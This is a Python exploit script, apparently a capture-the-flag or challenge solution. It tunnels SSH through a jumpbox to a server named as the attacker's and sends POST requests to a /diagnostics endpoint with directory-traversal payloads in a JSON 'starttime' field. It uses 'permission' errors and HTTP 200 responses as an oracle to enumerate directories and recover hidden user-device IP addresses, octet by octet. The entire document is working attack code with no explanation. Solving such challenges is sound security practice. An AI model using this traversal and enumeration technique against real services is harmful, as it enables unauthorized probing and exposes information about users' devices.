#!/usr/bin/env python3

import argparse
import subprocess
import time


def setup_connections(jumpbox_key, private_key, server_ip, local_port):
    # Set up port forwarding through jumpbox to SSH on attacker's server
    print("[+] Setting up port forwarding to attacker's server")
    cmd = f"ssh -i {jumpbox_key} -L {local_port}:{server_ip}:22 user@external-support.bluehorizonmobile.com"
    background_proc = subprocess.Popen(cmd.split(" "), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    time.sleep(3)

    # Set up process for interacting with attacker's server over SSH
    print("[+] Connecting to attacker's server over SSH")
    cmd = f"ssh -i {private_key} -p {local_port} nonroot_user@127.0.0.1"
    proc = subprocess.Popen(cmd.split(" "), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Clear output from stderr
    for _ in range(4):
        proc.stderr.readline()
    
    return background_proc, proc


def find_second_octets(proc, ips):
    print("[+] Searching for second octets")

    # Second octets all fall somewhere between 64 and 79 inclusive based on the netmask
    for i in range(64, 80):
        octet = hex(i).lstrip("0x").zfill(2).upper()

        request = (
            "POST /diagnostics HTTP/1.1\r\n"
            "Content-Length: 104\r\n"
            "\r\n"
            '{"command_response":{"endtime":"0000000000000000000000000","starttime":"../../../'+octet+'/0000000000000"}}\r\n'
            "\r\n"
        )

        proc.stdin.write(request.encode())
        proc.stdin.flush()

        for _ in range(5):
            line = proc.stderr.readline()
            # Assumes IPs do not have the same second octet
            if b"permission" in line:
                ips[0].append(i) if len(ips[0]) == 1 else ips[1].append(i)
    
    return ips


def find_remaining_octets(proc, ips):
    print("[+] Searching for remaining octets")

    for ip in ips:
        octet1 = hex(ip[1]).lstrip("0x").zfill(2).upper()

        for i in range(256):
            octet2 = hex(i).lstrip("0x").zfill(2).upper()

            request = (
                "POST /diagnostics HTTP/1.1\r\n"
                "Content-Length: 104\r\n"
                "\r\n"
                '{"command_response":{"endtime":"0000000000000000000000000","starttime":"../../../'+octet1+'/'+octet2+'/0000000000"}}\r\n'
                "\r\n"
            )

            proc.stdin.write(request.encode())
            proc.stdin.flush()

            for _ in range(5):
                line = proc.stderr.readline()
                if b"permission" in line:
                    ip.append(i)
                
            if len(ip) == 3:
                break

        octet2 = hex(ip[2]).lstrip("0x").zfill(2).upper()

        for i in range(256):
            octet3 = hex(i).lstrip("0x").zfill(2).upper()

            request = (
                "POST /diagnostics HTTP/1.1\r\n"
                "Content-Length: 104\r\n"
                "\r\n"
                '{"command_response":{"endtime":"0000000000000000000000000","starttime":"../../../'+octet1+'/'+octet2+'/'+octet3+'/0000000"}}\r\n'
                "\r\n"
            )

            proc.stdin.write(request.encode())
            proc.stdin.flush()

            for _ in range(5):
                line = proc.stderr.readline()
                if b"HTTP/1.1 200" in line:
                    ip.append(i)
            
            if len(ip) == 4:
                break

    return ips


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Enumerates directories on the attacker's server to find additional IPs")
    parser.add_argument("--jumpbox_key", "-j", required=True, type=str, help="Jumpbox SSH key path (e.g., jumpbox.key)")
    parser.add_argument("--private_key", "-p", required=True, type=str, help="Private SSH key path (e.g., id_ed25519)")
    parser.add_argument("--server_ip", "-s", required=True, type=str, help="Attacker server IP")
    
    args = parser.parse_args()
    local_port = 54321

    background_proc, proc = setup_connections(args.jumpbox_key, args.private_key, args.server_ip, local_port)

    # User device IPs are in the subnet 100.64.0.0/12, so they all begin with 100
    ips = [[100], [100]]
    ips = find_second_octets(proc, ips)
    ips = find_remaining_octets(proc, ips)

    for ip in ips:
        print(".".join(str(octet) for octet in ip))

    background_proc.kill()
    proc.kill()
